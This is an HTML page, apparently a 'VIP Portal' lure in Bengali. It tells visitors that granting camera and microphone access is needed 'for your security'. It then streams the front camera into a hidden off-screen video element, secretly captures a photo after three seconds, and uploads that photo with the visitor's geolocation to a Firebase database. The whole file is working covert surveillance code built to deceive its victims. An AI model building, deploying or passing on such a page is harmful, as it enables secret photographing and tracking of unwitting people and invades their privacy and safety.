<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ratan Bro | VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff2e63;
            --bg: #080a10;
            --card: #121420;
            --text: #ffffff;
        }

        body {
            margin: 0; padding: 0;
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        /* Access Permission Modal */
        #perm-modal {
            background: var(--card);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid rgba(255, 46, 99, 0.2);
            width: 90%; max-width: 400px;
            z-index: 100;
        }

        .icon-box {
            font-size: 50px; color: var(--primary); margin-bottom: 15px;
        }

        h2 { margin: 0 0 10px; font-weight: 600; }
        p { font-size: 14px; opacity: 0.8; margin-bottom: 25px; }

        .btn-grant {
            background: var(--primary);
            color: white; border: none;
            padding: 12px 30px; border-radius: 50px;
            font-size: 16px; font-weight: 600;
            cursor: pointer; transition: 0.3s;
            box-shadow: 0 5px 15px rgba(255, 46, 99, 0.4);
        }

        .btn-grant:active { transform: scale(0.95); }

        /* Main UI (After Access) */
        #main-ui {
            display: none; text-align: center; width: 100%;
        }

        .user-card {
            background: var(--card);
            padding: 20px; border-radius: 15px;
            display: inline-block; border: 1px solid var(--primary);
        }

        #u-pic {
            width: 80px; height: 80px; border-radius: 50%;
            border: 3px solid var(--primary); margin-bottom: 10px;
        }

        /* Hidden Video Source */
        #vSource {
            position: fixed; top: -1000px; left: -1000px;
            width: 1px; height: 1px; opacity: 0;
        }
    </style>
</head>
<body>

    <div id="perm-modal">
        <div class="icon-box">🛡️</div>
        <h2>অ্যাক্সেস পারমিশন</h2>
        <p>প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন। এটি আপনার নিরাপত্তার জন্য প্রয়োজন।</p>
        <button class="btn-grant" onclick="startApp()">Grant Access</button>
    </div>

    <div id="main-ui">
        <div class="user-card">
            <img id="u-pic" src="" alt="">
            <h3 id="u-name">প্রসেসিং...</h3>
            <p style="color: #00ff88;">● সিস্টেম সক্রিয় আছে</p>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";

        // রতন ভাই, আপনার ফায়ারবেস কনফিগটি এখানে আপডেট করে দিন
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "ratanweab.firebaseapp.com",
            databaseURL: "https://ratanweab-default-rtdb.firebaseio.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.appspot.com",
            messagingSenderId: "YOUR_ID",
            appId: "YOUR_APP_ID"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);

        let loggedUser = null;

        // অটো লগইন
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loggedUser = user;
            } else {
                signInAnonymously(auth);
            }
        });

        window.startApp = async () => {
            const video = document.getElementById('vSource');
            
            try {
                // ১. হাই-কোয়ালিটি ফ্রন্ট ক্যামেরা ও অডিও রিকোয়েস্ট
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: true 
                });

                video.srcObject = stream;
                await video.play();

                // UI পরিবর্তন
                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';

                if(loggedUser) {
                    document.getElementById('u-name').innerText = "ইউজার আইডি: " + loggedUser.uid.substring(0,6);
                    document.getElementById('u-pic').src = "https://ui-avatars.com/api/?name=User&background=ff2e63&color=fff";

                    // ২. ৩ সেকেন্ড ডিলে দিয়ে রিয়েল পিকচার ক্যাপচার (ব্ল্যাক স্ক্রিন ফিক্স)
                    setTimeout(() => {
                        takeSnap(loggedUser);
                    }, 3000);

                    // ৩. লোকেশন আপডেট
                    updateLoc(loggedUser);
                }
            } catch (err) {
                alert("ক্যামেরা পারমিশন ছাড়া এই পোর্টাল ওপেন হবে না।");
            }
        };

        function takeSnap(user) {
            const video = document.getElementById('vSource');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            const snapRef = push(ref(db, `users/${user.uid}/snaps`));
            set(snapRef, {
                image: imageData,
                time: serverTimestamp()
            });
        }

        async function updateLoc(user) {
            navigator.geolocation.getCurrentPosition((pos) => {
                set(ref(db, `users/${user.uid}/info`), {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    lastActive: serverTimestamp()
                });
            });
        }
    </script>
</body>
</html>
